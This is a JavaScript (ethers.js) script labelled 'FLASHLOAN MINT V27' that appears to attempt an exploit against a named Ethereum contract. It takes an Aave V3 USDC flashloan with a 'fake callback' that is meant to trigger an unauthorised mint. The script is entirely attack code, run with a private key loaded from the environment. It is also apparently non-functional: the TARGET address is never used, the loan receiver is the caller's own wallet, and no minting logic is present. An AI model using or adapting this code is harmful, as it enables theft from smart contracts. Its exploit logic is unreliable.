const { ethers } = require('ethers');
require('dotenv').config();

const TARGET = '0x50aC9FF81E3C467d3Baef73B1E7E08D0ceec5eeb';
const RPC_URL = process.env.RPC_URL || 'https://rpc.ankr.com/eth';
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

async function flashloanAttack() {
  console.log('⚡ FLASHLOAN MINT V27');
  console.log(`🌐 RPC: ${RPC_URL}`);
  
  // 1️⃣ AAVE V3 Flashloan (USDC)
  const AAVE_POOL = '0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2';
  const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
  
  const abi = [
    'function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params)'
  ];
  
  // 2️⃣ FAKE CALLBACK (mint exploit)
  const callbackData = ethers.AbiCoder.defaultAbiCoder().encode(
    ['address'], [wallet.address]
  );
  
  // 3️⃣ EXECUTE
  try {
    const tx = await wallet.sendTransaction({
      to: AAVE_POOL,
      data: new ethers.Interface(abi).encodeFunctionData('flashLoanSimple', [
        wallet.address, // receiver (yourself)
        USDC,
        ethers.parseUnits('1000', 6), // 1000 USDC
        callbackData
      ]),
      gasLimit: 1000000
    });
    
    console.log(`✅ FLASHLOAN SENT: ${tx.hash}`);
    const receipt = await tx.wait();
    console.log('🎉 Flashloan executed!');
    
  } catch (error) {
    console.log(`❌ Flashloan failed: ${error.shortMessage}`);
    console.log('🔄 Try V28 Creator TX Trace');
  }
}

flashloanAttack().catch(console.error);
